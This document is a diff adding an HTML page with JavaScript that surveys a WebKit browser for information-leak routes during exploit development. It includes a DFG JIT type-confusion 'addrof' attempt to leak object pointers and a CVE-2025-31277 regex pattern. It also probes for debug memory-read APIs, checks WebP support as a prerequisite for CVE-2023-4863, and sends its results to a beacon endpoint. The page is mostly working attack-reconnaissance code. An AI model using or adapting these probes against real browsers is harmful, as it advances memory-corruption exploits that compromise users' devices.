@@ -1,0 +1,444 @@
+<!--
+  p630: WebProcess text base — leak route survey
+
+  Tests multiple potential info-leak routes in one page load:
+  A) Error.stack — native frame addresses?
+  B) performance.now() resolution
+  C) WebP image decode support (CVE-2023-4863 prerequisite)
+  D) DFG type confusion (double[] vs object[] — classic addrof pattern)
+  E) Debug/internal APIs ($vm, gc, drainMicrotasks, etc.)
+  F) Native function toString — leak addresses?
+  G) DFG with regex match array (CVE-2025-31277 pattern)
+  H) FinalizationRegistry / WeakRef callback info
+  I) Performance timing entries (navigation/resource)
+  J) Available but unusual APIs
+
+  CRASH_CLASS: LOW (pure info gathering, no UAF triggers)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p630</title></head>
+<body>p630: textbase leak survey
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+var L = document.getElementById('log');
+var bQ = [];
+function emit(tag, msg) {
+  var s = tag + ' ' + (msg || '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 3) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 6).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P630-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+var f64 = new Float64Array(1);
+var u8 = new Uint8Array(f64.buffer);
+var u32 = new Uint32Array(f64.buffer);
+function d2h(d) {
+  f64[0] = d;
+  var h = '';
+  for (var i = 7; i >= 0; i--) h += ('0' + u8[i].toString(16)).slice(-2);
+  return h;
+}
+
+try {
+emit('START', navigator.userAgent ? navigator.userAgent.slice(0,60) : 'no-ua');
+
+// ================================================================
+// A: Error.stack — does it contain native addresses?
+// ================================================================
+function innerFunc() { return new Error(); }
+function outerFunc() { return innerFunc(); }
+var err = outerFunc();
+var stack = err.stack || '';
+emit('A-STACK', stack.replace(/\n/g, ' | ').slice(0, 300));
+
+// Check for hex addresses in stack
+var hexMatch = stack.match(/0x[0-9a-fA-F]{8,}/g);
+emit('A-HEX', hexMatch ? 'FOUND: ' + hexMatch.slice(0,5).join(', ') : 'NONE');
+
+// Try throwing and catching
+try { throw new Error('test'); } catch(e2) {
+  var s2 = e2.stack || '';
+  emit('A-THROW', s2.replace(/\n/g, ' | ').slice(0, 200));
+}
+
+// TypeError (native frame involved)
+try { null.x; } catch(e3) {
+  var s3 = e3.stack || '';
+  emit('A-TYPEERR', s3.replace(/\n/g, ' | ').slice(0, 200));
+}
+
+// RangeError from deep recursion
+function recur(n) { if (n > 0) return recur(n-1); return new Error(); }
+try { var e4 = recur(500); emit('A-DEEP', (e4.stack||'').replace(/\n/g,' | ').slice(0,200)); }
+catch(e5) { emit('A-DEEPERR', (e5.stack||'').replace(/\n/g,' | ').slice(0,200)); }
+
+// ================================================================
+// B: performance.now() resolution
+// ================================================================
+if (typeof performance !== 'undefined' && performance.now) {
+  var samples = [];
+  var prev = performance.now();
+  for (var bi = 0; bi < 100; bi++) {
+    var now = performance.now();
+    if (now !== prev) { samples.push(now - prev); prev = now; }
+  }
+  // Get minimum non-zero delta
+  samples.sort(function(a,b){return a-b;});
+  var minDelta = samples.length > 0 ? samples[0] : -1;
+  var maxDelta = samples.length > 0 ? samples[samples.length-1] : -1;
+  emit('B-PERF', 'min=' + minDelta + 'ms max=' + maxDelta + 'ms samples=' + samples.length);
+  emit('B-RAW', 'now=' + performance.now() + ' type=' + typeof performance.now());
+
+  // Measure loop timing
+  var t0 = performance.now();
+  var dummy = 0;
+  for (var bj = 0; bj < 1000000; bj++) dummy += bj;
+  var t1 = performance.now();
+  emit('B-LOOP', '1M iter=' + (t1-t0) + 'ms');
+} else {
+  emit('B-PERF', 'performance.now NOT available');
+}
+
+// ================================================================
+// C: WebP image decode support
+// ================================================================
+var webpData = 'data:image/webp;base64,UklGRiIAAABXRUJQVlA4IBYAAAAwAQCdASoBAAEADsD+JaQAA3AAAAAA';
+var imgTest = new Image();
+var webpDone = false;
+imgTest.onload = function() {
+  emit('C-WEBP', 'SUPPORTED w=' + imgTest.naturalWidth + ' h=' + imgTest.naturalHeight);
+  webpDone = true;
+};
+imgTest.onerror = function() {
+  emit('C-WEBP', 'NOT-SUPPORTED');
+  webpDone = true;
+};
+imgTest.src = webpData;
+
+// Also check via canvas
+try {
+  var tc = document.createElement('canvas');
+  tc.width = 1; tc.height = 1;
+  var tctx = tc.getContext('2d');
+  var webpUrl = tc.toDataURL('image/webp');
+  emit('C-ENCODE', 'toDataURL(webp)=' + (webpUrl.indexOf('image/webp') >= 0 ? 'YES' : 'NO') +
+    ' prefix=' + webpUrl.slice(0, 30));
+} catch(e) { emit('C-ENCODE', 'err=' + String(e).slice(0,60)); }
+
+// ================================================================
+// D: DFG type confusion — classic addrof pattern
+// Train with doubles, then pass objects
+// ================================================================
+function dfgVictim(arr) {
+  // Simple indexed read — DFG should specialize for ContiguousDouble
+  var v = arr[0];
+  return v;
+}
+
+// Warmup: train DFG to expect double arrays
+var trainArr = [1.1, 2.2, 3.3, 4.4];
+for (var di = 0; di < 200000; di++) {
+  dfgVictim(trainArr);
+}
+
+// Now pass an object array
+var leakTarget = {marker: 0xBEEF};
+var objArr = [leakTarget, null, null, null];
+var leaked = dfgVictim(objArr);
+
+emit('D-DFG', 'type=' + typeof leaked + ' val=' + leaked);
+if (typeof leaked === 'number' && leaked !== 0 && !isNaN(leaked)) {
+  emit('D-HEX', d2h(leaked));
+  // Check if it looks like a pointer (large integer)
+  f64[0] = leaked;
+  var hi = u32[1], lo = u32[0];
+  emit('D-PARTS', 'hi=0x' + hi.toString(16) + ' lo=0x' + lo.toString(16));
+  if (hi > 0 && hi < 0x7FFF) {
+    emit('D-LEAK', 'POINTER-SHAPED hi=0x' + hi.toString(16));
+  }
+} else if (typeof leaked === 'object') {
+  emit('D-SAFE', 'returned object (OSR exit worked)');
+}
+
+// Variant 2: function with explicit type check that DFG might eliminate
+function dfgVictim2(arr, idx) {
+  var v = arr[idx];
+  return v + 0; // force numeric coercion
+}
+for (var di2 = 0; di2 < 200000; di2++) {
+  dfgVictim2(trainArr, 0);
+}
+var leaked2 = dfgVictim2(objArr, 0);
+emit('D-DFG2', 'type=' + typeof leaked2 + ' val=' + leaked2 + ' hex=' + d2h(leaked2));
+
+// Variant 3: use arguments to confuse DFG
+function dfgVictim3() {
+  return arguments[0];
+}
+for (var di3 = 0; di3 < 200000; di3++) {
+  dfgVictim3(1.1);
+}
+var leaked3 = dfgVictim3(leakTarget);
+emit('D-DFG3', 'type=' + typeof leaked3 + ' val=' + (typeof leaked3 === 'object' ? 'obj' : leaked3));
+
+// ================================================================
+// E: Debug/internal APIs
+// ================================================================
+var debugAPIs = ['$vm', 'gc', 'drainMicrotasks', 'fullGC', 'edenGC',
+  'noInline', 'noDFG', 'noFTL', 'OSRExit', 'numberOfDFGCompiles',
+  'optimizeNextInvocation', 'jscStack', 'reoptimizationRetryCount',
+  'transferArrayBuffer', 'createProxy', 'gcHeapSize', 'addressOf',
+  'readMemory', '$262', 'createGlobalObject'];
+var found = [];
+for (var ei = 0; ei < debugAPIs.length; ei++) {
+  try {
+    var val = eval(debugAPIs[ei]);
+    if (typeof val !== 'undefined') found.push(debugAPIs[ei] + '=' + typeof val);
+  } catch(e) {}
+}
+emit('E-DEBUG', found.length > 0 ? found.join(', ') : 'NONE');
+
+// Check for WebKit internals
+var wkAPIs = ['internals', 'testRunner', 'GCController', 'IDBFactory',
+  'webkitRequestAnimationFrame', 'webkitURL', 'WebKitCSSMatrix'];
+var wkFound = [];
+for (var wi = 0; wi < wkAPIs.length; wi++) {
+  try {
+    var wv = eval(wkAPIs[wi]);
+    if (typeof wv !== 'undefined') wkFound.push(wkAPIs[wi] + '=' + typeof wv);
+  } catch(e) {}
+}
+emit('E-WEBKIT', wkFound.length > 0 ? wkFound.join(', ') : 'NONE');
+
+// ================================================================
+// F: Native function toString — addresses in source?
+// ================================================================
+var nativeFuncs = [Array, Object, Function, String, RegExp, JSON.parse,
+  Math.sin, parseInt, eval, ArrayBuffer, Uint8Array, Promise];
+var nativeNames = ['Array','Object','Function','String','RegExp','JSON.parse',
+  'Math.sin','parseInt','eval','ArrayBuffer','Uint8Array','Promise'];
+var fStrings = [];
+for (var fi = 0; fi < nativeFuncs.length; fi++) {
+  try {
+    var s = Function.prototype.toString.call(nativeFuncs[fi]);
+    // Check for hex addresses
+    if (/0x[0-9a-f]{6,}/i.test(s)) {
+      fStrings.push(nativeNames[fi] + ':HAS-HEX:' + s.slice(0,80));
+    }
+  } catch(e) {}
+}
+emit('F-TOSTR', fStrings.length > 0 ? fStrings.join(' | ') : 'NO-HEX (all clean)');
+
+// Sample native toString
+emit('F-SAMPLE', 'Array=' + String(Array).slice(0,60) + ' | eval=' + String(eval).slice(0,60));
+
+// ================================================================
+// G: DFG regex match array (CVE-2025-31277 pattern)
+// Regex.exec with global flag — match result might have wrong structure
+// ================================================================
+function regexMatchLeak() {
+  var re = /a/g;
+  var str = 'aaa';
+  var results = [];
+  var m;
+  while ((m = re.exec(str)) !== null) {
+    results.push(m);
+  }
+  return results;
+}
+
+// Train DFG
+for (var gi = 0; gi < 100000; gi++) {
+  regexMatchLeak();
+}
+
+// Now check the result arrays for anomalies
+var matches = regexMatchLeak();
+var anomalies = [];
+for (var mi = 0; mi < matches.length; mi++) {
+  var ma = matches[mi];
+  // Check if the match array has unexpected properties or wrong prototype
+  if (Object.getPrototypeOf(ma) !== Array.prototype) anomalies.push('proto');
+  if (typeof ma.index !== 'number') anomalies.push('index-type=' + typeof ma.index);
+  if (typeof ma.input !== 'string') anomalies.push('input-type=' + typeof ma.input);
+  // Check if any element is not what we expect
+  if (typeof ma[0] !== 'string') anomalies.push('elem0-type=' + typeof ma[0]);
+}
+emit('G-REGEX', 'matches=' + matches.length + ' anomalies=' + (anomalies.length > 0 ? anomalies.join(',') : 'NONE'));
+
+// Variant: regex exec with capturing groups under DFG pressure
+function regexCaptureLeak(str) {
+  var re = /(.)(.)(.)/g;
+  var m = re.exec(str);
+  if (m) return [m[0], m[1], m[2], m[3], m.index];
+  return null;
+}
+for (var gi2 = 0; gi2 < 100000; gi2++) {
+  regexCaptureLeak('abcdef');
+}
+var capResult = regexCaptureLeak('abcdef');
+emit('G-CAPTURE', capResult ? capResult.join(',') : 'null');
+
+// ================================================================
+// H: FinalizationRegistry / WeakRef
+// ================================================================
+if (typeof FinalizationRegistry !== 'undefined') {
+  emit('H-FINREG', 'available');
+  try {
+    var leaked_info = null;
+    var fr = new FinalizationRegistry(function(heldValue) {
+      leaked_info = heldValue;
+    });
+    var target = {};
+    fr.register(target, 'witness');
+    target = null;
+    // Force GC
+    for (var hi = 0; hi < 50; hi++) {
+      var waste = new ArrayBuffer(1024 * 1024);
+    }
+    emit('H-CALLBACK', 'fired=' + (leaked_info !== null) + ' val=' + leaked_info);
+  } catch(e) { emit('H-ERR', String(e).slice(0,80)); }
+} else {
+  emit('H-FINREG', 'NOT available');
+}
+
+if (typeof WeakRef !== 'undefined') {
+  emit('H-WEAKREF', 'available');
+  try {
+    var wr = new WeakRef({test: 1});
+    emit('H-DEREF', 'deref=' + typeof wr.deref());
+    // After GC
+    var wrt = {};
+    var wr2 = new WeakRef(wrt);
+    wrt = null;
+    for (var hi2 = 0; hi2 < 50; hi2++) { var w2 = new ArrayBuffer(1024*1024); }
+    emit('H-AFTER-GC', 'deref=' + typeof wr2.deref() + ' (null=collected)');
+  } catch(e) { emit('H-WRERR', String(e).slice(0,80)); }
+} else {
+  emit('H-WEAKREF', 'NOT available');
+}
+
+// ================================================================
+// I: Performance timing entries
+// ================================================================
+if (typeof performance !== 'undefined') {
+  try {
+    var entries = performance.getEntriesByType('navigation');
+    if (entries.length > 0) {
+      var nav = entries[0];
+      emit('I-NAV', 'type=' + nav.type + ' duration=' + nav.duration +
+        ' domComplete=' + nav.domComplete + ' name=' + (nav.name||'').slice(0,60));
+    } else {
+      emit('I-NAV', 'no navigation entries');
+    }
+  } catch(e) { emit('I-NAV', 'err=' + String(e).slice(0,60)); }
+
+  try {
+    var res = performance.getEntriesByType('resource');
+    emit('I-RES', 'count=' + res.length);
+    for (var ri2 = 0; ri2 < Math.min(res.length, 3); ri2++) {
+      emit('I-RES' + ri2, 'name=' + res[ri2].name.slice(0,60) + ' dur=' + res[ri2].duration);
+    }
+  } catch(e) {}
+
+  // Check memory API
+  if (performance.memory) {
+    emit('I-MEM', 'usedJSHeap=' + performance.memory.usedJSHeapSize +
+      ' totalJSHeap=' + performance.memory.totalJSHeapSize +
+      ' limit=' + performance.memory.jsHeapSizeLimit);
+  } else {
+    emit('I-MEM', 'performance.memory NOT available');
+  }
+} else {
+  emit('I-PERF', 'performance NOT available');
+}
+
+// ================================================================
+// J: Misc unusual APIs
+// ================================================================
+// ArrayBuffer.transfer
+try {
+  var ab1 = new ArrayBuffer(16);
+  if (typeof ab1.transfer === 'function') {
+    emit('J-TRANSFER', 'ArrayBuffer.transfer EXISTS');
+    var ab2 = ab1.transfer();
+    emit('J-TRANSFER', 'transferred ok, new len=' + ab2.byteLength + ' old len=' + ab1.byteLength);
+  } else if (typeof ArrayBuffer.transfer === 'function') {
+    emit('J-TRANSFER', 'ArrayBuffer.transfer (static) EXISTS');
+  } else {
+    emit('J-TRANSFER', 'NOT available');
+  }
+} catch(e) { emit('J-TRANSFER', 'err=' + String(e).slice(0,60)); }
+
+// structuredClone
+if (typeof structuredClone === 'function') {
+  emit('J-CLONE', 'structuredClone available');
+  try {
+    var ab3 = new ArrayBuffer(8);
+    var v = new DataView(ab3);
+    v.setBigUint64(0, BigInt('0xDEADBEEFCAFEBABE'));
+    var cloned = structuredClone(ab3, {transfer: [ab3]});
+    var v2 = new DataView(cloned);
+    emit('J-CLONE-XFER', 'orig_detached=' + (ab3.byteLength === 0) + ' clone=' + v2.getBigUint64(0).toString(16));
+  } catch(e) { emit('J-CLONE-ERR', String(e).slice(0,60)); }
+} else {
+  emit('J-CLONE', 'NOT available');
+}
+
+// Proxy traps — can we intercept internal operations?
+try {
+  var pTarget = [1.1, 2.2, 3.3];
+  var trapLog = [];
+  var proxy = new Proxy(pTarget, {
+    get: function(t, p) {
+      if (typeof p === 'string' && p !== 'length' && p !== 'constructor')
+        trapLog.push('get:' + String(p));
+      return t[p];
+    },
+    getPrototypeOf: function(t) {
+      trapLog.push('getProto');
+      return Object.getPrototypeOf(t);
+    }
+  });
+  // Feed proxy to Array methods — see what operations JSC performs
+  Array.prototype.slice.call(proxy);
+  JSON.stringify(proxy);
+  emit('J-PROXY', 'traps=' + trapLog.slice(0,15).join(','));
+} catch(e) { emit('J-PROXY', 'err=' + String(e).slice(0,60)); }
+
+// BigUint64Array on ArrayBuffer — can we read raw values?
+try {
+  var bigBuf = new ArrayBuffer(64);
+  var bigView = new BigUint64Array(bigBuf);
+  bigView[0] = BigInt('0x4141414141414141');
+  var readBack = bigView[0];
+  emit('J-BIG64', 'write/read ok val=0x' + readBack.toString(16));
+} catch(e) { emit('J-BIG64', 'err=' + String(e).slice(0,60)); }
+
+// Check if CSS.escape or similar exposes internal state
+try {
+  if (typeof CSS !== 'undefined' && CSS.escape) {
+    emit('J-CSS', 'CSS.escape available');
+  }
+  if (typeof CSS !== 'undefined' && CSS.supports) {
+    emit('J-CSSSUP', 'font-face:' + CSS.supports('font-display', 'swap'));
+  }
+} catch(e) {}
+
+// Wait a moment for WebP test then report
+setTimeout(function() {
+  if (!webpDone) emit('C-WEBP', 'TIMEOUT (no load/error after 2s)');
+  emit('ALIVE', 'survey complete');
+  flush();
+}, 2000);
+
+} catch(e) { emit('FATAL', String(e).slice(0,200)); flush(); }
+})();
+</script>
+</body></html>
